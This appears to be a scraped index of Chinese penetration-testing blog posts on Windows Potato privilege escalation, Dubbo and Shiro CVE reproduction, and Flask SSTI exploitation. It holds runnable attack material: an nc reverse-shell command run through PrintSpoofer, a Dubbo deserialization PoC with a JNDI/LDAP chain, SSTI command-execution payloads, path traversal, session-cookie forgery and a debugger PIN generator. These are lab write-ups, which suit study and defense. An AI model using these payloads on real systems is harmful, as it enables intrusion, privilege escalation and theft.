https://github.com/ohpe/juicy-potato/blob/master/Test/test_clsid.bat bat 脚本不需要做修改 3.2.3 提权 上传 CS 的马，或者反弹一个交互式的 shell 回来： 利用 JuicePotato 执行命令或 C2 程序 ","date":"2020-08-15","objectID":"/2020/08/potato%E5%AE%B6%E6%97%8F%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/:3:3","tags":["渗透测试","提权"],"title":"Potato 家族提权分析","uri":"/2020/08/potato%E5%AE%B6%E6%97%8F%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/"},{"categories":["渗透测试","提权"],"content":"4 PrintSpoofer (PipePotato or BadPotato) ","date":"2020-08-15","objectID":"/2020/08/potato%E5%AE%B6%E6%97%8F%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/:4:0","tags":["渗透测试","提权"],"title":"Potato 家族提权分析","uri":"/2020/08/potato%E5%AE%B6%E6%97%8F%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/"},{"categories":["渗透测试","提权"],"content":"4.1 原理 通过 Windows named pipe 的一个 API: ImpersonateNamedPipeClient来模拟高权限客户端的 token（还有类似的ImpersonatedLoggedOnUser，RpcImpersonateClient函数），调用该函数后会更改当前线程的安全上下文，它利用了打印机组件路径检查的 BUG，使 SYSTEM 权限服务能连接到攻击者创建的 named pipe。 spoolsv.exe 服务有一个公开的 RPC 服务，里面有以下函数： DWORD RpcRemoteFindFirstPrinterChangeNotificationEx( /* [in] */ PRINTER_HANDLE hPrinter, /* [in] */ DWORD fdwFlags, /* [in] */ DWORD fdwOptions, /* [unique][string][in] */ wchar_t *pszLocalMachine, /* [in] */ DWORD dwPrinterLocal, /* [unique][in] */ RPC_V2_NOTIFY_OPTIONS *pOptions) pszLocalMachine 参数需要传递 UNC 路径，传递 \\\\127.0.0.1 时，服务器会访问 \\\\127.0.0.1\\pipe\\spoolss，但这个管道已经被系统注册了，如果我们传递 \\\\127.0.0.1\\pipe 则因为路径检查而报错 但当传递 \\\\127.0.0.1/pipe/foo 时，校验路径时会认为 127.0.0.1/pipe/foo 是主机名，随后在连接 named pipe 时会对参数做标准化，将 / 转化为 \\，于是就会连接 \\\\127.0.0.1\\pipe\\foo\\pipe\\spoolss，攻击者就可以注册这个 named pipe 从而窃取 client 的 token。这个 POC 启动新进程是使用 CreateProcessAsUser 而不是 CreateProcessWithToken。 ","date":"2020-08-15","objectID":"/2020/08/potato%E5%AE%B6%E6%97%8F%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/:4:1","tags":["渗透测试","提权"],"title":"Potato 家族提权分析","uri":"/2020/08/potato%E5%AE%B6%E6%97%8F%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/"},{"categories":["渗透测试","提权"],"content":"4.2 实战 工具地址：https://github.com/itm4n/PrintSpoofer 4.2.1 派生一个 SYSTEM 交互式 shell 适用于当前为交互式 shell 的状态下： C:\\TOOLS\u003ePrintSpoofer.exe -i -c cmd [+] Found privilege: SeImpersonatePrivilege [+] Named pipe listening... [+] CreateProcessAsUser() OK Microsoft Windows [Version 10.0.19613.1000] (c) 2020 Microsoft Corporation. All rights reserved. C:\\WINDOWS\\system32\u003ewhoami nt authority\\system 4.2.2 派生一个 SYSTEM 的进程 适用于无交互式 shell，但是可以命令执行，使用 CS 上马或者 nc 反弹高权限 shell： C:\\TOOLS\u003ePrintSpoofer.exe -c \"C:\\TOOLS\\nc.exe 10.10.13.37 1337 -e cmd\" [+] Found privilege: SeImpersonatePrivilege [+] Named pipe listening... [+] CreateProcessAsUser() OK 4.2.3 桌面环境下派生 SYSTEM 进程 在本地登录或者 RDP 下，先用 qwinsta 查看当前 ID 号，然后利用 POC： C:\\TOOLS\u003ePrintSpoofer.exe -d 3 -c \"powershell -ep bypass\" [+] Found privilege: SeImpersonatePrivilege [+] Named pipe listening... [+] CreateProcessAsUser() OK ","date":"2020-08-15","objectID":"/2020/08/potato%E5%AE%B6%E6%97%8F%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/:4:2","tags":["渗透测试","提权"],"title":"Potato 家族提权分析","uri":"/2020/08/potato%E5%AE%B6%E6%97%8F%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/"},{"categories":["渗透测试","提权"],"content":"5 RoguePotato ","date":"2020-08-15","objectID":"/2020/08/potato%E5%AE%B6%E6%97%8F%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/:5:0","tags":["渗透测试","提权"],"title":"Potato 家族提权分析","uri":"/2020/08/potato%E5%AE%B6%E6%97%8F%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/"},{"categories":["渗透测试","提权"],"content":"5.1 原理 这个也是利用了命名管道 微软修补后，高版本 Windows DCOM 解析器不允许 OBJREF 中的 DUALSTRINGARRAY 字段指定端口号。为了绕过这个限制并能做本地令牌协商，作者在一台远程主机上的 135 端口做流量转发，将其转回受害者本机端口，并写了一个恶意 RPC OXID 解析器。 ","date":"2020-08-15","objectID":"/2020/08/potato%E5%AE%B6%E6%97%8F%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/:5:1","tags":["渗透测试","提权"],"title":"Potato 家族提权分析","uri":"/2020/08/potato%E5%AE%B6%E6%97%8F%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/"},{"categories":["渗透测试","提权"],"content":"5.2 实战 工具地址：https://github.com/antonioCoco/RoguePotato Mandatory args: -r remote_ip: ip of the remote machine to use as redirector -e commandline: commandline of the program to launch Optional args: -l listening_port: This will run the RogueOxidResolver locally on the specified port -c {clsid}: CLSID (default BITS:{4991d34b-80a1-4291-83b6-3328366b9097}) -p pipename_placeholder: placeholder to be used in the pipe name creation (default: RoguePotato) -z : this flag will randomize the pipename_placeholder (don't use with -p) ","date":"2020-08-15","objectID":"/2020/08/potato%E5%AE%B6%E6%97%8F%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/:5:2","tags":["渗透测试","提权"],"title":"Potato 家族提权分析","uri":"/2020/08/potato%E5%AE%B6%E6%97%8F%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/"},{"categories":["渗透测试","提权"],"content":"6 SweetPotato ","date":"2020-08-15","objectID":"/2020/08/potato%E5%AE%B6%E6%97%8F%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/:6:0","tags":["渗透测试","提权"],"title":"Potato 家族提权分析","uri":"/2020/08/potato%E5%AE%B6%E6%97%8F%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/"},{"categories":["渗透测试","提权"],"content":"6.1 原理 COM/WinRM/Spoolsv 的集合版，也就是 Juicy/PrintSpoofer 的集合版 ","date":"2020-08-15","objectID":"/2020/08/potato%E5%AE%B6%E6%97%8F%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/:6:1","tags":["渗透测试","提权"],"title":"Potato 家族提权分析","uri":"/2020/08/potato%E5%AE%B6%E6%97%8F%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/"},{"categories":["渗透测试","提权"],"content":"6.2 实战 工具地址：https://github.com/CCob/SweetPotato 参考： https://foxglovesecurity.com/2016/01/16/hot-potato/ https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/ https://xz.aliyun.com/t/7776/#toc-4 https://3gstudent.github.io/3gstudent.github.io/Windows本地提权工具Juicy-Potato测试分析/ https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/ https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/ ","date":"2020-08-15","objectID":"/2020/08/potato%E5%AE%B6%E6%97%8F%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/:6:2","tags":["渗透测试","提权"],"title":"Potato 家族提权分析","uri":"/2020/08/potato%E5%AE%B6%E6%97%8F%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/"},{"categories":["漏洞复现"],"content":"Apache Dubbo Provider反序列化漏洞原理及复现","date":"2020-07-01","objectID":"/2020/07/apache-dubbo-provider%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9Ecve-2020-1948/","tags":["Dubbo","漏洞复现"],"title":"Apache Dubbo Provider反序列化漏洞(CVE-2020-1948)","uri":"/2020/07/apache-dubbo-provider%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9Ecve-2020-1948/"},{"categories":["漏洞复现"],"content":"Apache Dubbo Provider反序列化漏洞(CVE-2020-1948) Apache Dubbo Provider 存在反序列化漏洞，攻击者可以通过 RPC 请求发送无法识别的服务名称或方法名称以及一些恶意参数有效载荷，当恶意参数被反序列化时，可以造成远程代码执行。 ","date":"2020-07-01","objectID":"/2020/07/apache-dubbo-provider%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9Ecve-2020-1948/:0:0","tags":["Dubbo","漏洞复现"],"title":"Apache Dubbo Provider反序列化漏洞(CVE-2020-1948)","uri":"/2020/07/apache-dubbo-provider%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9Ecve-2020-1948/"},{"categories":["漏洞复现"],"content":"影响版本 Dubbo 2.7.0 - 2.7.6 Dubbo 2.6.0 - 2.6.7 Dubbo 2.5.x （官方不再维护） ","date":"2020-07-01","objectID":"/2020/07/apache-dubbo-provider%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9Ecve-2020-1948/:1:0","tags":["Dubbo","漏洞复现"],"title":"Apache Dubbo Provider反序列化漏洞(CVE-2020-1948)","uri":"/2020/07/apache-dubbo-provider%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9Ecve-2020-1948/"},{"categories":["漏洞复现"],"content":"环境搭建 复现环境： MAC Dubbo 2.5.9 JDK 8U20 环境下载地址： https://gist.github.com/OneSourceCat/01277dceba635eefbc010af36d3704d7 将下载的环境导入到 IDEA 中： mac 下安装 zookeeper： brew install zookeeper brew services start zookeeper 修改 Provider.java 文件，指定 Spring 加载配置文件的方式： ClassPathXmlApplicationContext context = new ClassPathXmlApplicationContext(\"file:/Volumes/MacOS/WorkSpace/JAVA/dubbo-poc/DubboModules/src/resources/provider.xml\") ; 修改 Consumer.java 文件，指定 Spring 加载配置文件的方式： ClassPathXmlApplicationContext context = new ClassPathXmlApplicationContext(\"file:/Volumes/MacOS/WorkSpace/JAVA/dubbo-poc/dubboconsumer/resources/consumer.xml\") ; 运行 Provider.java： 编译 ExportObject.java public class ExportObject { public ExportObject() throws Exception { try { java.lang.Runtime.getRuntime().exec(\"open /System/Applications/Calculator.app\"); } catch (java.io.IOException e) { e.printStackTrace(); } } public static void main(String[] args) throws Exception { ExportObject e = new ExportObject(); } } javac ExportObject.java 注意：此处要用相同版本或低版本的 JDK 进行编译，否则反序列化失败。 启动 LDAP 服务： java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer \"http://127.0.0.1:8000/#ExportObject\" 8087 启动 HTTP 服务： python3 -m http.server 运行 consumer.java，反序列化： 发现可以成功弹出计算器。 使用 poc 进行测试： 使用前先 pip install dubbo from dubbo.codec.hessian2 import Decoder,new_object from dubbo.client import DubboClient client = DubboClient('127.0.0.1', 20881) JdbcRowSetImpl=new_object( 'com.sun.rowset.JdbcRowSetImpl', dataSource=\"ldap://127.0.0.1:8087/#ExportObject\", strMatchColumns=[\"foo\"] ) JdbcRowSetImplClass=new_object( 'java.lang.Class', name=\"com.sun.rowset.JdbcRowSetImpl\", ) toStringBean=new_object( 'com.rometools.rome.feed.impl.ToStringBean', beanClass=JdbcRowSetImplClass, obj=JdbcRowSetImpl ) resp = client.send_request_and_return_response( service_name='org.apache.dubbo.spring.boot.demo.consumer.DemoService', method_name='rce', args=[toStringBean]) ","date":"2020-07-01","objectID":"/2020/07/apache-dubbo-provider%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9Ecve-2020-1948/:2:0","tags":["Dubbo","漏洞复现"],"title":"Apache Dubbo Provider反序列化漏洞(CVE-2020-1948)","uri":"/2020/07/apache-dubbo-provider%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9Ecve-2020-1948/"},{"categories":["漏洞复现"],"content":"Shiro 权限绕过漏洞复现(CVE-2020-11989)","date":"2020-07-01","objectID":"/2020/07/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0cve-2020-11989/","tags":["Shiro","漏洞复现"],"title":"Shiro 权限绕过漏洞复现(CVE-2020-11989)","uri":"/2020/07/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0cve-2020-11989/"},{"categories":["漏洞复现"],"content":"Shiro 权限绕过漏洞复现(CVE-2020-11989) ","date":"2020-07-01","objectID":"/2020/07/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0cve-2020-11989/:0:0","tags":["Shiro","漏洞复现"],"title":"Shiro 权限绕过漏洞复现(CVE-2020-11989)","uri":"/2020/07/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0cve-2020-11989/"},{"categories":["漏洞复现"],"content":"影响范围 Apache Shiro \u003c 1.5.3 Spring 框架中只使用 Shiro 鉴权 ","date":"2020-07-01","objectID":"/2020/07/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0cve-2020-11989/:1:0","tags":["Shiro","漏洞复现"],"title":"Shiro 权限绕过漏洞复现(CVE-2020-11989)","uri":"/2020/07/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0cve-2020-11989/"},{"categories":["漏洞复现"],"content":"环境搭建 git clone https://github.com/l3yx/springboot-shiro.git 将项目导入 IDEA 中，本地演示环境为 Mac OS，配置 Maven: /usr/local/Cellar/maven/3.6.3_1/libexec/conf/settings.xml 添加本地镜像： \u003cmirror\u003e \u003cid\u003ealimaven\u003c/id\u003e \u003cmirrorOf\u003ecentral\u003c/mirrorOf\u003e \u003cname\u003ealiyun maven\u003c/name\u003e \u003curl\u003ehttp://maven.aliyun.com/nexus/content/repositories/central/\u003c/url\u003e \u003c/mirror\u003e \u003c!-- 下面的两个中央仓库都是 maven 软件内置的，服务于整个互联网，由 Maven 团队自己维护，里面存储了非常全的 jar 包，包含了世界上大部分流行的开源项目构件 --\u003e \u003c!-- 中央仓库1 --\u003e \u003cmirror\u003e \u003cid\u003erepo1\u003c/id\u003e \u003cmirrorOf\u003ecentral\u003c/mirrorOf\u003e \u003cname\u003eHuman Readable Name for this Mirror.\u003c/name\u003e \u003curl\u003ehttp://repo1.maven.org/maven2/\u003c/url\u003e \u003c/mirror\u003e \u003c!-- 中央仓库2 --\u003e \u003cmirror\u003e \u003cid\u003erepo2\u003c/id\u003e \u003cmirrorOf\u003ecentral\u003c/mirrorOf\u003e \u003cname\u003eHuman Readable Name for this Mirror.\u003c/name\u003e \u003curl\u003ehttp://repo2.maven.org/maven2/\u003c/url\u003e \u003c/mirror\u003e 更改 IDEA 中的 Maven home directory 和 User settings file 配置： 生成 war 包： 将打包好的 war 包部署于 Tomcat 。该漏洞成功利用存在下面两个条件 应用不能部署在根目录，也就是需要 context-path ， server.servlet.context-path=/shiro ,如果为根目录则 context-path 为空，就会被 CVE-2020-1957 的 patch 将 URL 格式化，值得注意的是若 Shiro 版本小于 1.5.2 的话那么该条件就不需要。 Spring 控制器中没有另外的权限校验代码 漏洞环境的权限配置如下，其中 /admin 下的路由需要登录才能访问: @Bean ShiroFilterFactoryBean shiroFilterFactoryBean(){ ShiroFilterFactoryBean bean = new ShiroFilterFactoryBean(); bean.setSecurityManager(securityManager()); bean.setLoginUrl(\"/login\"); bean.setSuccessUrl(\"/index\"); bean.setUnauthorizedUrl(\"/unauthorizedurl\"); Map\u003cString, String\u003e map = new LinkedHashMap\u003c\u003e(); map.put(\"/doLogin\", \"anon\"); map.put(\"/admin/*\", \"authc\"); bean.setFilterChainDefinitionMap(map); return bean; } --- @GetMapping(\"/admin/page\") public String admin() { return \"admin page\"; } ","date":"2020-07-01","objectID":"/2020/07/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0cve-2020-11989/:2:0","tags":["Shiro","漏洞复现"],"title":"Shiro 权限绕过漏洞复现(CVE-2020-11989)","uri":"/2020/07/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0cve-2020-11989/"},{"categories":["漏洞复现"],"content":"漏洞复现 如果直接访问 /shiro/admin/page ，会返回 302 跳转要求登录 直接访问 /;/test/admin/page , 就能直接绕过 Shiro 权限验证，访问到 /admin 路由中的信息 ","date":"2020-07-01","objectID":"/2020/07/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0cve-2020-11989/:3:0","tags":["Shiro","漏洞复现"],"title":"Shiro 权限绕过漏洞复现(CVE-2020-11989)","uri":"/2020/07/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0cve-2020-11989/"},{"categories":["渗透测试"],"content":"Flask SSTI 利用方式探索","date":"2020-06-22","objectID":"/2020/06/flask-ssti-%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E6%8E%A2%E7%B4%A2/","tags":["渗透测试","SSTI"],"title":"Flask SSTI 利用方式探索","uri":"/2020/06/flask-ssti-%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E6%8E%A2%E7%B4%A2/"},{"categories":["渗透测试"],"content":"Flask SSTI 利用方式探索 ","date":"2020-06-22","objectID":"/2020/06/flask-ssti-%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E6%8E%A2%E7%B4%A2/:0:0","tags":["渗透测试","SSTI"],"title":"Flask SSTI 利用方式探索","uri":"/2020/06/flask-ssti-%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E6%8E%A2%E7%B4%A2/"},{"categories":["渗透测试"],"content":"python 语言基础 在 python 中，object 类是 Python 中所有类的基类，如果定义一个类时没有指定继承哪个类，则默认继承 object 类。 每个类都有的魔术变量 __class__，表示当前类。 print(\"\".__class__) 每个类都有一个 __base__ 属性，列出其基类： 列出所有基类：__bases__ 列举类的调用顺序：__mro__ 获取子类集合：''.__class__.__mro__[1].__subclasses__() 接下来寻找可以执行命令的子类：os._wrap_close(133) 查找可使用的变量和方法：\"\".__class__.__mro__[1].__subclasses__()[133].__init__.__globals__ 执行系统命令：\"\".__class__.__mro__[1].__subclasses__()[133].__init__.__globals__['popen']('ls').read() 读取文件内容：\"\".__class__.__mro__[1].__subclasses__()[133].__init__.__globals__[\"__builtins__\"][\"open\"](\"flag.txt\").read() ","date":"2020-06-22","objectID":"/2020/06/flask-ssti-%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E6%8E%A2%E7%B4%A2/:1:0","tags":["渗透测试","SSTI"],"title":"Flask SSTI 利用方式探索","uri":"/2020/06/flask-ssti-%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E6%8E%A2%E7%B4%A2/"},{"categories":["渗透测试"],"content":"SSTI 简介 \u0026 环境搭建 ","date":"2020-06-22","objectID":"/2020/06/flask-ssti-%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E6%8E%A2%E7%B4%A2/:2:0","tags":["渗透测试","SSTI"],"title":"Flask SSTI 利用方式探索","uri":"/2020/06/flask-ssti-%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E6%8E%A2%E7%B4%A2/"},{"categories":["渗透测试"],"content":"模板 一个统一风格的站点，其大多数页面样式都是一致的，只是每个页面显示的内容各不相同。要是所有的逻辑都放在前端进行，无疑会影响响应效果和效率，很不现实。把所有的逻辑放在后端，又会导致太过复杂，前轻后重 模板的诞生是为了将显示与数据分离，让前端工作人员专注表现设计，后台人员注重业务逻辑，同时简化代码的复杂程度。模板技术多种多样，但其本质是将模板文件和数据通过模板引擎生成最终的HTML代码。 Flask 使用 Jinja2 作为模板引擎，Jinja 的语法很简单，大致有这么几种： {%...%} 语句 (Statements) {{...}} 打印模板输出的表达式 (Expressions) {{#...#}} 注释 #...## 行注释 (Line Statements) ","date":"2020-06-22","objectID":"/2020/06/flask-ssti-%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E6%8E%A2%E7%B4%A2/:2:1","tags":["渗透测试","SSTI"],"title":"Flask SSTI 利用方式探索","uri":"/2020/06/flask-ssti-%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E6%8E%A2%E7%B4%A2/"},{"categories":["渗透测试"],"content":"SSTI 在 SSTI 漏洞点中，{{x}} 里面的内容会被执行。 SSTI，又称服务端模板注入攻击。jinja2 模板中使用 {} 语法表示一个变量，它是一种特殊的占位符。当利用 jinja2 进行渲染的时候，它会把这些特殊的占位符进行填充/替换。但是在进行目标编译渲染的过程中，执行了用户插入的恶意内容，因而可能导致了敏感信息泄露、代码执行、 GetShell 等问题 ","date":"2020-06-22","objectID":"/2020/06/flask-ssti-%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E6%8E%A2%E7%B4%A2/:2:2","tags":["渗透测试","SSTI"],"title":"Flask SSTI 利用方式探索","uri":"/2020/06/flask-ssti-%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E6%8E%A2%E7%B4%A2/"},{"categories":["渗透测试"],"content":"环境搭建 测试环境搭建：Ubuntu + Docker 环境： https://github.com/Tiaonmmn/pasecactf_2019_web_honey_shop ","date":"2020-06-22","objectID":"/2020/06/flask-ssti-%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E6%8E%A2%E7%B4%A2/:2:3","tags":["渗透测试","SSTI"],"title":"Flask SSTI 利用方式探索","uri":"/2020/06/flask-ssti-%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E6%8E%A2%E7%B4%A2/"},{"categories":["渗透测试"],"content":"敏感信息泄露导致身份伪造 ","date":"2020-06-22","objectID":"/2020/06/flask-ssti-%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E6%8E%A2%E7%B4%A2/:3:0","tags":["渗透测试","SSTI"],"title":"Flask SSTI 利用方式探索","uri":"/2020/06/flask-ssti-%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E6%8E%A2%E7%B4%A2/"},{"categories":["渗透测试"],"content":"flask session 机制 通过.隔开的 3 段内容，第一段其实就是 base64encode 后的内容，但去掉了填充用的等号，若 decode 失败，自己需要补上 1-3 个等号补全。中间内容为时间戳，在 flask 中时间戳若超过 31 天则视为无效。最后一段则是安全签名，将 session data，时间戳和 flask 的 secretkey 通过 sha1 运算的结果。 ","date":"2020-06-22","objectID":"/2020/06/flask-ssti-%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E6%8E%A2%E7%B4%A2/:3:1","tags":["渗透测试","SSTI"],"title":"Flask SSTI 利用方式探索","uri":"/2020/06/flask-ssti-%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E6%8E%A2%E7%B4%A2/"},{"categories":["渗透测试"],"content":"方法一 该应用在 /hello 下存在 SSTI 漏洞: config 下泄露了 SECRET_KEY： 使用 flask-unsign 工具（使用 pip 安装）伪造 Cookie： flask-unsign --sign --cookie \"{'balance': 6666}\" --secret \"7xrQRfVWmTHMRzwGXLhCQrECTqLndq1ODnvvDjKZ\" ","date":"2020-06-22","objectID":"/2020/06/flask-ssti-%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E6%8E%A2%E7%B4%A2/:3:2","tags":["渗透测试","SSTI"],"title":"Flask SSTI 利用方式探索","uri":"/2020/06/flask-ssti-%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E6%8E%A2%E7%B4%A2/"},{"categories":["渗透测试"],"content":"方法二 http://127.0.0.1:8345/download?image=1.jpg 存在任意文件下载漏洞，下载环境变量文件： http://127.0.0.1:8345/download?image=../../../../../../../../../proc/self/environ ","date":"2020-06-22","objectID":"/2020/06/flask-ssti-%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E6%8E%A2%E7%B4%A2/:3:3","tags":["渗透测试","SSTI"],"title":"Flask SSTI 利用方式探索","uri":"/2020/06/flask-ssti-%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E6%8E%A2%E7%B4%A2/"},{"categories":["渗透测试"],"content":"Flask PIN 码利用 ","date":"2020-06-22","objectID":"/2020/06/flask-ssti-%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E6%8E%A2%E7%B4%A2/:4:0","tags":["渗透测试","SSTI"],"title":"Flask SSTI 利用方式探索","uri":"/2020/06/flask-ssti-%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E6%8E%A2%E7%B4%A2/"},{"categories":["渗透测试"],"content":"Flask PIN 码 Flask Debug 应用在模式下提供的一种页面端的交互调试工具，和我们平时使用的 Python 命令行是一样的，也就是给我们提供了一个交互式的 web 端 shell。但是 PIN 码的生成规则是有规律可循的，使得获取 PIN 码成为可能，之后能够利用的方式有很多。 from itertools import chain probably_public_bits = [ 'root',# username 'flask.app',# modname 'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__')) '/usr/local/lib/python3.8/site-packages/flask/app.py' # getattr(mod, '__file__', None), ] private_bits = [ '345051575547'# str(uuid.getnode()), /sys/class/net/eth0/address '613cacd3857f425e9409e544dece08da', # get_machine_id(), /etc/machine-id ] h = hashlib.md5() for bit in chain(probably_public_bits, private_bits): if not bit: continue if isinstance(bit, str): bit = bit.encode('utf-8') h.update(bit) h.update(b'cookiesalt') cookie_name = '__wzd' + h.hexdigest()[:20] num = None if num is None: h.update(b'pinsalt') num = ('%09d' % int(h.hexdigest(), 16))[:9] rv =None if rv is None: for group_size in 5, 4, 3: if len(num) % group_size == 0: rv = '-'.join(num[x:x + group_size].rjust(group_size, '0') for x in range(0, len(num), group_size)) break else: rv = num print(rv) 脚本中 6 个参数的获取方法： username 运行 flask 的用户，之前读取 /etc/passwd 获取 modname 一般默认即可 app name 一般默认即可 路径 debug 下报错 网络地址 读取：/sys/class/net/eth0/address int(\"02:42:ac:13:00:02\".replace(\":\", \"\"), 16) 机器码 读取：/etc/machine-id 或者 /proc/self/cgroup ","date":"2020-06-22","objectID":"/2020/06/flask-ssti-%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E6%8E%A2%E7%B4%A2/:4:1","tags":["渗透测试","SSTI"],"title":"Flask SSTI 利用方式探索","uri":"/2020/06/flask-ssti-%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E6%8E%A2%E7%B4%A2/"},{"categories":["渗透测试"],"content":"执行脚本 ","date":"2020-06-22","objectID":"/2020/06/flask-ssti-%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E6%8E%A2%E7%B4%A2/:4:2","tags":["渗透测试","SSTI"],"title":"Flask SSTI 利用方式探索","uri":"/2020/06/flask-ssti-%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E6%8E%A2%E7%B4%A2/"},{"categories":["渗透测试"],"content":"SSTI 导致 RCE ","date":"2020-06-22","objectID":"/2020/06/flask-ssti-%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E6%8E%A2%E7%B4%A2/:5:0","tags":["渗透测试","SSTI"],"title":"Flask SSTI 利用方式探索","uri":"/2020/06/flask-ssti-%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E6%8E%A2%E7%B4%A2/"},{"categories":["渗透测试"],"content":"代码执行 {%for i in range(10)%} {%print(i)%} {%endfor%} ","date":"2020-06-22","objectID":"/2020/06/flask-ssti-%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E6%8E%A2%E7%B4%A2/:5:1","tags":["渗透测试","SSTI"],"title":"Flask SSTI 利用方式探索","uri":"/2020/06/flask-ssti-%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E6%8E%A2%E7%B4%A2/"},{"categories":["渗透测试"],"content":"python 魔法函数 + 内置函数 魔法函数 所谓魔法函数(Magic Methods)，是 Python 的一种高级语法，允许你在类中自定义函数(函数名格式一般为 __x__)，并绑定到类的特殊方法中。比如在类 A 中自定义 __str__ 函数，则在调用 str(A) 时，会自动调用 __str__ 函数，并返回相应的结果。在我们平时的使用中，可能经常使用 __init__ 函数和 __del__ 函数，其实这也是魔法函数的一种。 内置函数 在 python 中输入 help(__builtins__)，可以查看帮助，简单地说就是 Python 中自带的函数 http://127.0.0.1:8345/hello?name=\\{\\{%22%22.__class__.__base__.__subclasses__()[302].__init__.__globals__[%27os%27].popen(%22whoami%22).read()\\}\\} ","date":"2020-06-22","objectID":"/2020/06/flask-ssti-%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E6%8E%A2%E7%B4%A2/:5:2","tags":["渗透测试","SSTI"],"title":"Flask SSTI 利用方式探索","uri":"/2020/06/flask-ssti-%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E6%8E%A2%E7%B4%A2/"},{"categories":["渗透测试"],"content":"Redis 